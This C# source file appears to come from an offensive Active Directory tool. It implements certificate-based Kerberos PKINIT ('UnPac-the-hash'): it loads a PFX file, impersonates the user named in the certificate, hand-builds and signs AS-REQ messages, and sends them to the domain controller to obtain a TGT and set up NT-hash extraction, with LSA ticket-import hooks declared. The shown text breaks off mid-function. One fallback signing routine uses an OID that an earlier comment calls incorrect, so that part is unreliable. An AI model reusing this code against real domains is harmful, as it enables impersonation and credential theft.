using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Collections.Generic;
using System.Linq;

namespace SpicyAD
{
    public static class PkinitAuth
    {
        // P/Invoke for LSA ticket import
        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            ref LSA_STRING PackageName,
            out int AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            int AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaFreeReturnBuffer(IntPtr Buffer);

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        private const int KerbSubmitTicketMessage = 21;

        // P/Invoke for native PKINIT
        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr pvLogonID,
            IntPtr pAuthData,
            IntPtr pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SecHandle phCredential,
            ref long ptsExpiry);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int InitializeSecurityContext(
            ref SecHandle phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            ref SecHandle phNewContext,
            ref SecBufferDesc pOutput,
            ref int pfContextAttr,
            ref long ptsExpiry);

        [StructLayout(LayoutKind.Sequential)]
        private struct SecHandle
        {
            public IntPtr dwLower;
            public IntPtr dwUpper;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SecBufferDesc
        {
            public int ulVersion;
            public int cBuffers;
            public IntPtr pBuffers;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SecBuffer
        {
            public int cbBuffer;
            public int BufferType;
            public IntPtr pvBuffer;
        }

        private const int SECPKG_CRED_OUTBOUND = 2;
        private const int ISC_REQ_ALLOCATE_MEMORY = 0x00000100;
        private const int SECBUFFER_TOKEN = 2;

        // P/Invoke for sacrifice session (CreateNetOnly)
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithLogonW(
            string lpUsername,
            string lpDomain,
            string lpPassword,
            int dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            int dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaRegisterLogonProcess(
            ref LSA_STRING LogonProcessName,
            out IntPtr LsaHandle,
            out ulong SecurityMode);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_STATISTICS
        {
            public LUID TokenId;
            public LUID AuthenticationId;
            public long ExpirationTime;
            public uint TokenType;
            public uint ImpersonationLevel;
            public uint DynamicCharged;
            public uint DynamicAvailable;
            public uint GroupCount;
            public uint PrivilegeCount;
            public LUID ModifiedId;
        }

        private const int LOGON_NETCREDENTIALS_ONLY = 2;
        private const int CREATE_NEW_CONSOLE = 0x00000010;
        private const int CREATE_SUSPENDED = 0x00000004;
        private const uint TOKEN_QUERY = 0x0008;
        private const int TokenStatistics = 10;

        private static bool TryNativePkinit(string pfxPath, string password, string domain, string targetUser, bool showCredentials)
        {
            OutputHelper.Verbose("[*] Attempting native Windows PKINIT...");

            try
            {
                // Load certificate into CurrentUser store temporarily
                X509Certificate2 cert = new X509Certificate2(pfxPath, password ?? "",
                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.UserKeySet);

                OutputHelper.Verbose($"[+] Certificate loaded: {cert.Subject}");

                // Extract user from certificate if not provided
                string certUser = ExtractUserFromCertificate(cert);
                if (string.IsNullOrEmpty(targetUser))
                {
                    targetUser = certUser;
                }

                // Check if we're trying to impersonate a different user
                string currentUser = Environment.UserName;
                if (!string.IsNullOrEmpty(targetUser) &&
                    !targetUser.Equals(currentUser, StringComparison.OrdinalIgnoreCase))
                {
                    OutputHelper.Verbose($"[!] Native SSPI cannot impersonate different users (current: {currentUser}, target: {targetUser})");
                    OutputHelper.Verbose("[*] Falling back to manual PKINIT implementation...");
                    return false;
                }

                // Install to user store temporarily
                X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
                store.Open(OpenFlags.ReadWrite);

                bool wasInStore = store.Certificates.Contains(cert);
                if (!wasInStore)
                {
                    store.Add(cert);
                    OutputHelper.Verbose("[*] Certificate temporarily added to user store");
                }

                try
                {
                    if (string.IsNullOrEmpty(domain))
                    {
                        domain = GetDomainFromEnvironment();
                    }

                    string spn = $"krbtgt/{domain.ToUpper()}";
                    OutputHelper.Verbose($"[*] Requesting TGT for {targetUser}@{domain.ToUpper()}");
                    OutputHelper.Verbose($"[*] Target SPN: {spn}");

                    // Use Kerberos SSPI to get TGT
                    SecHandle credHandle = new SecHandle();
                    long expiry = 0;

                    int result = AcquireCredentialsHandle(
                        null,
                        "Kerberos",
                        SECPKG_CRED_OUTBOUND,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        ref credHandle,
                        ref expiry);

                    if (result != 0)
                    {
                        OutputHelper.Verbose($"[!] AcquireCredentialsHandle failed: 0x{result:X8}");
                        return false;
                    }

                    OutputHelper.Verbose("[+] Credentials handle acquired");

                    // Initialize security context
                    SecHandle contextHandle = new SecHandle();
                    SecBufferDesc outputDesc = new SecBufferDesc();
                    SecBuffer outputBuffer = new SecBuffer();

                    outputBuffer.BufferType = SECBUFFER_TOKEN;
                    outputBuffer.cbBuffer = 0;
                    outputBuffer.pvBuffer = IntPtr.Zero;

                    outputDesc.ulVersion = 0;
                    outputDesc.cBuffers = 1;

                    IntPtr outputBufferPtr = Marshal.AllocHGlobal(Marshal.SizeOf(outputBuffer));
                    Marshal.StructureToPtr(outputBuffer, outputBufferPtr, false);
                    outputDesc.pBuffers = outputBufferPtr;

                    int contextAttr = 0;
                    long contextExpiry = 0;

                    result = InitializeSecurityContext(
                        ref credHandle,
                        IntPtr.Zero,
                        spn,
                        ISC_REQ_ALLOCATE_MEMORY,
                        0,
                        0,
                        IntPtr.Zero,
                        0,
                        ref contextHandle,
                        ref outputDesc,
                        ref contextAttr,
                        ref contextExpiry);

                    Marshal.FreeHGlobal(outputBufferPtr);

                    if (result == 0 || result == 0x00090312) // SEC_I_CONTINUE_NEEDED
                    {
                        Console.WriteLine("[+] TGT obtained successfully via native PKINIT!");
                        Console.WriteLine($"[+] User: {targetUser}@{domain.ToUpper()}");
                        OutputHelper.Verbose($"[+] Service: krbtgt/{domain.ToUpper()}");

                        if (showCredentials)
                        {
                            OutputHelper.Verbose("\n[*] For credential extraction, the TGT is now cached.");
                            OutputHelper.Verbose("[*] Use 'klist' to view cached tickets.");
                        }

                        return true;
                    }
                    else
                    {
                        OutputHelper.Verbose($"[!] InitializeSecurityContext failed: 0x{result:X8}");
                        return false;
                    }
                }
                finally
                {
                    // Cleanup - remove cert from store if we added it
                    if (!wasInStore)
                    {
                        try
                        {
                            store.Remove(cert);
                            OutputHelper.Verbose("[*] Certificate removed from user store");
                        }
                        catch { }
                    }
                    store.Close();
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] Native PKINIT error: {ex.Message}");
                return false;
            }
        }

        // Kerberos message types
        private const int KRB_AS_REQ = 10;
        private const int KRB_AS_REP = 11;
        private const int KRB_ERROR = 30;

        // Encryption types
        private const int ETYPE_AES256_CTS_HMAC_SHA1 = 18;
        private const int ETYPE_AES128_CTS_HMAC_SHA1 = 17;
        private const int ETYPE_RC4_HMAC = 23;

        // PA-DATA types
        private const int PA_PK_AS_REQ = 16;
        private const int PA_PK_AS_REP = 17;
        private const int PA_ETYPE_INFO2 = 19;

        // MODP Group 2 (RFC 2409) - 1024 bit for DH key exchange
        // Used by Windows PKINIT
        private static readonly byte[] DH_P_MODP2 = new byte[] {
            0x00, // positive
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
            0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
            0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
            0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
            0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
            0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
            0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
            0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
            0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
            0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
            0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
            0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
            0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
            0x49, 0x28, 0x66, 0x51, 0xEC, 0xE6, 0x53, 0x81,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
        };
        private static readonly byte[] DH_G_MODP2 = new byte[] { 0x02 };

        // Store DH keys for session
        private static byte[] _dhPrivateKey;
        private static byte[] _dhPublicKey;
        private static byte[] _dhReplyKey; // AS reply key derived from DH (for PAC_CREDENTIAL_INFO)

        public static void AskTgt(string pfxPath, string password, string domain, string targetUser, bool showCredentials)
        {
            Console.WriteLine("[*] PKINIT Auth (UnPac-the-hash)\n");

            try
            {
                // Try native Windows PKINIT first
                if (TryNativePkinit(pfxPath, password, domain, targetUser, showCredentials))
                    return;

                OutputHelper.Verbose("[*] Native method unavailable, trying manual PKINIT...\n");

                // Load the certificate
                OutputHelper.Verbose($"[*] Loading certificate from: {pfxPath}");

                if (!File.Exists(pfxPath))
                {
                    Console.WriteLine($"[!] Certificate file not found: {pfxPath}");
                    return;
                }

                X509Certificate2 cert = new X509Certificate2(pfxPath, password ?? "", X509KeyStorageFlags.Exportable);

                OutputHelper.Verbose($"[+] Certificate loaded successfully");
                OutputHelper.Verbose($"    Subject: {cert.Subject}");
                OutputHelper.Verbose($"    Issuer: {cert.Issuer}");
                OutputHelper.Verbose($"    Thumbprint: {cert.Thumbprint}");
                OutputHelper.Verbose($"    Has Private Key: {cert.HasPrivateKey}");

                if (!cert.HasPrivateKey)
                {
                    Console.WriteLine("[!] Certificate does not have a private key!");
                    return;
                }

                // Extract user from certificate if not provided
                if (string.IsNullOrEmpty(targetUser))
                {
                    targetUser = ExtractUserFromCertificate(cert);
                    OutputHelper.Verbose($"[*] Extracted user from certificate: {targetUser}");
                }

                // Get domain if not provided
                if (string.IsNullOrEmpty(domain))
                {
                    domain = GetDomainFromEnvironment();
                    OutputHelper.Verbose($"[*] Using domain: {domain}");
                }

                // Find KDC
                string kdc = GetKDC(domain);
                _lastKdcHost = kdc;
                OutputHelper.Verbose($"[*] KDC: {kdc}");

                // Build and send AS-REQ with PKINIT
                OutputHelper.Verbose($"\n[*] Building AS-REQ for {targetUser}@{domain.ToUpper()}...");

                byte[] asReq = BuildPkinitAsReq(cert, targetUser, domain);

                if (asReq == null || asReq.Length == 0)
                {
                    Console.WriteLine("[!] Failed to build AS-REQ");
                    return;
                }

                OutputHelper.Verbose($"[+] AS-REQ built ({asReq.Length} bytes)");
                OutputHelper.Verbose($"[*] Sending to KDC {kdc}:88...");

                // Send to KDC
                byte[] response = SendToKdc(kdc, 88, asReq);

                if (response == null || response.Length == 0)
                {
                    Console.WriteLine("[!] No response from KDC");
                    return;
                }

                OutputHelper.Verbose($"[+] Received response ({response.Length} bytes)");

                // Parse response
                ParseKdcResponse(response, cert, targetUser, domain, showCredentials);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
            }
        }

        private static string ExtractUserFromCertificate(X509Certificate2 cert)
        {
            // Try to extract UPN from SAN
            foreach (var ext in cert.Extensions)
            {
                if (ext.Oid.Value == "2.5.29.17") // Subject Alternative Name
                {
                    var san = new AsnEncodedData(ext.Oid, ext.RawData);
                    string sanStr = san.Format(false);

                    // Look for UPN
                    if (sanStr.Contains("Principal Name="))
                    {
                        int start = sanStr.IndexOf("Principal Name=") + 15;
                        int end = sanStr.IndexOf(",", start);
                        if (end == -1) end = sanStr.Length;
                        string upn = sanStr.Substring(start, end - start).Trim();
                        if (upn.Contains("@"))
                            return upn.Split('@')[0];
                    }
                }
            }

            // Fallback to CN from subject
            string subject = cert.Subject;
            if (subject.StartsWith("CN="))
            {
                int end = subject.IndexOf(",");
                if (end == -1) end = subject.Length;
                return subject.Substring(3, end - 3);
            }

            return null;
        }

        private static string GetDomainFromEnvironment()
        {
            try
            {
                return System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            catch
            {
                return Environment.UserDomainName + ".local";
            }
        }

        private static string GetKDC(string domain)
        {
            // First check if DC IP was specified via command line
            if (!string.IsNullOrEmpty(AuthContext.DcIp))
            {
                OutputHelper.Verbose($"[*] Using specified DC IP as KDC: {AuthContext.DcIp}");
                return AuthContext.DcIp;
            }

            // Try to get DC from environment
            try
            {
                string logonServer = Environment.GetEnvironmentVariable("LOGONSERVER");
                if (!string.IsNullOrEmpty(logonServer))
                {
                    string dc = logonServer.TrimStart('\\') + "." + domain;
                    // Verify it resolves
                    var entry = System.Net.Dns.GetHostEntry(dc);
                    if (entry != null)
                        return dc;
                }
            }
            catch { }

            // Try direct domain lookup
            try
            {
                var dnsHost = System.Net.Dns.GetHostEntry(domain);
                if (dnsHost.AddressList.Length > 0)
                    return domain;
            }
            catch { }

            // Try common DC naming
            try
            {
                string[] commonNames = { "dc", "dc1", "dc01", "ad", "kdc" };
                foreach (string name in commonNames)
                {
                    string dcFqdn = $"{name}.{domain}";
                    try
                    {
                        var entry = System.Net.Dns.GetHostEntry(dcFqdn);
                        if (entry != null)
                            return dcFqdn;
                    }
                    catch { }
                }
            }
            catch { }

            return domain;
        }

        // Store nonce for later use in AS-REP processing
        private static int _lastNonce;
        private static DateTime _lastCtime;
        private static string _lastKdcHost;
        private static byte[] _actualSessionKey;
        private static bool _ntHashExtracted = false;

        private static byte[] BuildPkinitAsReq(X509Certificate2 cert, string user, string domain)
        {
            try
            {
                string realm = domain.ToUpper();

                // Build req-body FIRST so we can calculate checksum
                byte[] reqBody = BuildReqBody(user, realm);

                // Calculate SHA-1 checksum of req-body for paChecksum (RFC 4556 specifies SHA-1)
                byte[] paChecksum;
                using (SHA1 sha1 = SHA1.Create())
                {
                    paChecksum = sha1.ComputeHash(reqBody);
                }
                OutputHelper.Verbose($"[*] paChecksum (SHA-1): {BitConverter.ToString(paChecksum).Replace("-", "").Substring(0, 16)}...");

                // Build AS-REQ structure (RFC 4120)
                // KDC-REQ ::= SEQUENCE {
                //   pvno            [1] INTEGER (5),
                //   msg-type        [2] INTEGER (10 for AS-REQ),
                //   padata          [3] SEQUENCE OF PA-DATA OPTIONAL,
                //   req-body        [4] KDC-REQ-BODY
                // }
                List<byte> asReq = new List<byte>();

                // pvno [1] INTEGER (5)
                byte[] pvno = BuildContextTag(1, BuildInteger(5));

                // msg-type [2] INTEGER (10 = AS-REQ)
                byte[] msgType = BuildContextTag(2, BuildInteger(KRB_AS_REQ));

                // padata [3] SEQUENCE OF PA-DATA
                byte[] padata = BuildPkinitPadata(cert, user, realm, paChecksum);
                byte[] padataSeq = BuildContextTag(3, BuildSequence(padata));

                // req-body [4] KDC-REQ-BODY
                byte[] reqBodyTag = BuildContextTag(4, reqBody);

                // Combine all
                asReq.AddRange(pvno);
                asReq.AddRange(msgType);
                asReq.AddRange(padataSeq);
                asReq.AddRange(reqBodyTag);

                // Wrap in SEQUENCE
                byte[] asReqSeq = BuildSequence(asReq.ToArray());

                // Wrap in APPLICATION 10
                byte[] result = BuildApplication(KRB_AS_REQ, asReqSeq);

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error building AS-REQ: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
                return null;
            }
        }

        private static byte[] BuildPkinitPadata(X509Certificate2 cert, string user, string realm, byte[] paChecksum)
        {
            // Build PA-PK-AS-REQ
            // This contains the signed authentication data

            List<byte> padata = new List<byte>();

            // Build AuthPack with paChecksum
            byte[] authPack = BuildAuthPack(user, realm, paChecksum);
            OutputHelper.Verbose($"[*] AuthPack built ({authPack.Length} bytes)");

            // Sign with certificate - create CMS SignedData
            byte[] signedData = SignData(cert, authPack);
            OutputHelper.Verbose($"[*] SignedData created ({signedData.Length} bytes)");

            // PA-PK-AS-REQ structure (RFC 4556)
            // PA-PK-AS-REQ ::= SEQUENCE {
            //   signedAuthPack          [0] IMPLICIT OCTET STRING,
            //                               -- Contains a CMS type ContentInfo encoded
            //   ...
            // }
            // IMPLICIT means the tag replaces the universal tag
            // So we use [0] directly with the raw CMS SignedData bytes
            // The signedData is already a complete CMS ContentInfo structure

            // Build [0] IMPLICIT OCTET STRING containing the CMS SignedData
            // For IMPLICIT, we use the context tag directly with the content
            List<byte> signedAuthPackBytes = new List<byte>();
            signedAuthPackBytes.Add(0x80); // [0] IMPLICIT (primitive, context-specific)
            signedAuthPackBytes.AddRange(EncodeLength(signedData.Length));
            signedAuthPackBytes.AddRange(signedData);

            byte[] paPkAsReq = BuildSequence(signedAuthPackBytes.ToArray());

            // PA-DATA structure
            // padata-type [1] Int32 (PA-PK-AS-REQ = 16)
            // padata-value [2] OCTET STRING
            byte[] padataType = BuildContextTag(1, BuildInteger(PA_PK_AS_REQ));
            byte[] padataValue = BuildContextTag(2, BuildOctetString(paPkAsReq));

            padata.AddRange(padataType);
            padata.AddRange(padataValue);

            return BuildSequence(padata.ToArray());
        }

        private static void GenerateDhKeys()
        {
            // Generate DH private key (random 128 bytes, less than p)
            _dhPrivateKey = new byte[128];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(_dhPrivateKey);
            }
            // Ensure it's positive and less than p
            _dhPrivateKey[0] &= 0x7F;

            // Calculate public key: g^x mod p
            // Using BigInteger for modular exponentiation
            var p = new System.Numerics.BigInteger(DH_P_MODP2.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());
            var g = new System.Numerics.BigInteger(DH_G_MODP2.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());
            var x = new System.Numerics.BigInteger(_dhPrivateKey.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());

            var y = System.Numerics.BigInteger.ModPow(g, x, p);

            // Convert to big-endian byte array
            byte[] yBytesRaw = y.ToByteArray();
            // Reverse to get big-endian
            Array.Reverse(yBytesRaw);

            // Remove leading zeros if any, but keep at least one byte
            int start = 0;
            while (start < yBytesRaw.Length - 1 && yBytesRaw[start] == 0) start++;

            // Create public key array (128 bytes padded)
            _dhPublicKey = new byte[128];
            int copyLen = yBytesRaw.Length - start;
            if (copyLen > 128) copyLen = 128;
            int destOffset = 128 - copyLen;
            if (destOffset < 0) destOffset = 0;
            Array.Copy(yBytesRaw, start, _dhPublicKey, destOffset, copyLen);

            OutputHelper.Verbose($"[+] DH key pair generated (MODP Group 2)");
        }

        private static byte[] BuildDhSubjectPublicKeyInfo()
        {
            try
            {
                // SubjectPublicKeyInfo ::= SEQUENCE {
                //   algorithm AlgorithmIdentifier,
                //   subjectPublicKey BIT STRING
                // }

                // AlgorithmIdentifier for DH:
                // algorithm: 1.2.840.10046.2.1 (dhpublicnumber)
                // parameters: DomainParameters (p, g, q optional)

                // Build DomainParameters
                List<byte> domainParams = new List<byte>();
                // p INTEGER
                domainParams.AddRange(BuildInteger(DH_P_MODP2));
                // g INTEGER
                domainParams.AddRange(BuildInteger(DH_G_MODP2));

                byte[] domainParamsSeq = BuildSequence(domainParams.ToArray());

                // Build AlgorithmIdentifier
                // dhpublicnumber OID: 1.2.840.10046.2.1
                byte[] dhOid = new byte[] { 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };
                byte[] algId = BuildSequence(Combine(dhOid, domainParamsSeq));

                // Build BIT STRING with public key (INTEGER)
                byte[] publicKeyInt = BuildInteger(_dhPublicKey);

                // Build BIT STRING
                List<byte> bitString = new List<byte>();
                bitString.Add(0x03); // BIT STRING tag
                bitString.AddRange(EncodeLength(publicKeyInt.Length + 1));
                bitString.Add(0x00); // unused bits
                bitString.AddRange(publicKeyInt);

                // Build SubjectPublicKeyInfo
                byte[] result = BuildSequence(Combine(algId, bitString.ToArray()));
                OutputHelper.Verbose($"[*] DH SubjectPublicKeyInfo built ({result.Length} bytes)");
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error building DH SubjectPublicKeyInfo: {ex.Message}");
                Console.WriteLine($"[!] Stack: {ex.StackTrace}");
                throw;
            }
        }

        private static byte[] BuildAuthPack(string user, string realm, byte[] paChecksum)
        {
            // AuthPack ::= SEQUENCE {
            //   pkAuthenticator [0] PKAuthenticator,
            //   clientPublicValue [1] SubjectPublicKeyInfo OPTIONAL (for DH)
            // }

            // PKAuthenticator ::= SEQUENCE {
            //   cusec [0] INTEGER (microseconds)
            //   ctime [1] KerberosTime
            //   nonce [2] INTEGER
            //   paChecksum [3] OCTET STRING OPTIONAL (SHA-1 of req-body)
            // }

            // Generate DH keys for this session
            GenerateDhKeys();

            _lastCtime = DateTime.UtcNow;
            int cusec = _lastCtime.Millisecond * 1000;
            string ctime = _lastCtime.ToString("yyyyMMddHHmmss") + "Z";
            _lastNonce = new Random().Next(100000000, 999999999);

            List<byte> pkAuth = new List<byte>();
            pkAuth.AddRange(BuildContextTag(0, BuildInteger(cusec)));
            pkAuth.AddRange(BuildContextTag(1, BuildGeneralizedTime(ctime)));
            pkAuth.AddRange(BuildContextTag(2, BuildInteger(_lastNonce)));

            // Include paChecksum (RFC 4556 requires SHA-1)
            if (paChecksum != null && paChecksum.Length > 0)
            {
                pkAuth.AddRange(BuildContextTag(3, BuildOctetString(paChecksum)));
            }

            byte[] pkAuthSeq = BuildSequence(pkAuth.ToArray());

            // Build AuthPack with DH public key
            List<byte> authPackContent = new List<byte>();
            authPackContent.AddRange(BuildContextTag(0, pkAuthSeq)); // pkAuthenticator

            // Add clientPublicValue [1] for DH mode
            byte[] clientPublicValue = BuildDhSubjectPublicKeyInfo();
            authPackContent.AddRange(BuildContextTag(1, clientPublicValue));

            byte[] authPack = BuildSequence(authPackContent.ToArray());

            OutputHelper.Verbose($"[+] AuthPack built with DH public key ({authPack.Length} bytes)");
            return authPack;
        }

        private static byte[] BuildInteger(byte[] value)
        {
            List<byte> result = new List<byte>();
            result.Add(0x02); // INTEGER tag

            // Ensure positive (add 0x00 if high bit set)
            bool needsPadding = (value[0] & 0x80) != 0;
            int len = value.Length + (needsPadding ? 1 : 0);

            result.AddRange(EncodeLength(len));
            if (needsPadding) result.Add(0x00);
            result.AddRange(value);

            return result.ToArray();
        }

        private static byte[] SignData(X509Certificate2 cert, byte[] authPackData)
        {
            // Try .NET SignedCms first (most compatible with Windows)
            try
            {
                // CRITICAL: Use Microsoft's id-pkinit-authData OID: 1.3.6.1.5.2.3.1
                // NOT 1.2.840.113549.1.9.16.1.9 which is for S/MIME
                Oid pkinitOid = new Oid("1.3.6.1.5.2.3.1", "id-pkinit-authData");
                ContentInfo content = new ContentInfo(pkinitOid, authPackData);

                // Create SignedCms with content embedded (not detached)
                SignedCms signedCms = new SignedCms(content, false);

                // Create signer with SHA-1 for compatibility
                CmsSigner signer = new CmsSigner(SubjectIdentifierType.IssuerAndSerialNumber, cert);
                signer.DigestAlgorithm = new Oid("1.3.14.3.2.26"); // SHA-1
                signer.IncludeOption = X509IncludeOption.EndCertOnly;

                // Compute signature
                signedCms.ComputeSignature(signer, false);

                byte[] result = signedCms.Encode();
                OutputHelper.Verbose($"[+] CMS SignedData created ({result.Length} bytes)");
                OutputHelper.Verbose($"[*] Using OID: 1.3.6.1.5.2.3.1 (id-pkinit-authData)");
                return result;
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] .NET SignedCms failed: {ex.Message}");
                OutputHelper.Verbose("[*] Falling back to manual CMS construction...");
                return BuildPkinitSignedData(cert, authPackData);
            }
        }

        private static byte[] BuildPkinitSignedData(X509Certificate2 cert, byte[] authPackData)
        {
            try
            {
                // Get RSA private key for signing
                using (RSA rsa = cert.GetRSAPrivateKey())
                {
                    if (rsa == null)
                        throw new Exception("No RSA private key available");

                    // Sign the authPackData directly using SHA-1 (more compatible with older KDCs)
                    // Windows KDC might expect SHA-1 for PKINIT
                    byte[] signature = rsa.SignData(authPackData, HashAlgorithmName.SHA1, RSASignaturePadding.Pkcs1);

                    // Build CMS ContentInfo { SignedData }
                    // ContentInfo ::= SEQUENCE {
                    //   contentType OBJECT IDENTIFIER,
                    //   content [0] EXPLICIT ANY DEFINED BY contentType
                    // }

                    // SignedData OID: 1.2.840.113549.1.7.2
                    byte[] signedDataOid = new byte[] { 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02 };

                    // Build SignedData
                    byte[] signedDataContent = BuildInnerSignedData(cert, authPackData, signature);

                    // Wrap SignedData in [0] EXPLICIT
                    byte[] signedDataWrapped = BuildContextTag(0, signedDataContent);

                    // Build ContentInfo
                    List<byte> contentInfo = new List<byte>();
                    contentInfo.AddRange(signedDataOid);
                    contentInfo.AddRange(signedDataWrapped);

                    byte[] result = BuildSequence(contentInfo.ToArray());
                    OutputHelper.Verbose($"[+] CMS ContentInfo created ({result.Length} bytes)");
                    return result;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error building CMS SignedData: {ex.Message}");
                throw;
            }
        }

        private static byte[] BuildInnerSignedData(X509Certificate2 cert, byte[] content, byte[] signature)
        {
            // SignedData ::= SEQUENCE {
            //   version CMSVersion,
            //   digestAlgorithms DigestAlgorithmIdentifiers,
            //   encapContentInfo EncapsulatedContentInfo,
            //   certificates [0] IMPLICIT CertificateSet OPTIONAL,
            //   signerInfos SignerInfos
            // }

            List<byte> signedData = new List<byte>();

            // version INTEGER (1 for SignedData with certificates)
            signedData.AddRange(BuildInteger(1));

            // digestAlgorithms SET OF AlgorithmIdentifier
            // SHA-1: 1.3.14.3.2.26
            byte[] sha1Oid = new byte[] { 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A };
            byte[] sha1AlgId = BuildSequence(sha1Oid);
            signedData.AddRange(BuildSet(sha1AlgId));

            // encapContentInfo SEQUENCE
            // id-pkinit-authData: 1.2.840.113549.1.9.16.1.9
            byte[] pkinitOid = new byte[] { 0x06, 0x0B, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x10, 0x01, 0x09 };
            // eContent [0] EXPLICIT OCTET STRING
            byte[] eContent = BuildContextTag(0, BuildOctetString(content));
            byte[] encapContentInfo = BuildSequence(Combine(pkinitOid, eContent));
            signedData.AddRange(encapContentInfo);

            // certificates [0] IMPLICIT CertificateSet
            // Tag 0xA0 with certificate DER bytes
            byte[] certBytes = cert.RawData;
            List<byte> certsImplicit = new List<byte>();
            certsImplicit.Add(0xA0); // [0] constructed
            certsImplicit.AddRange(EncodeLength(certBytes.Length));
            certsImplicit.AddRange(certBytes);
            signedData.AddRange(certsImplicit);

            // signerInfos SET OF SignerInfo
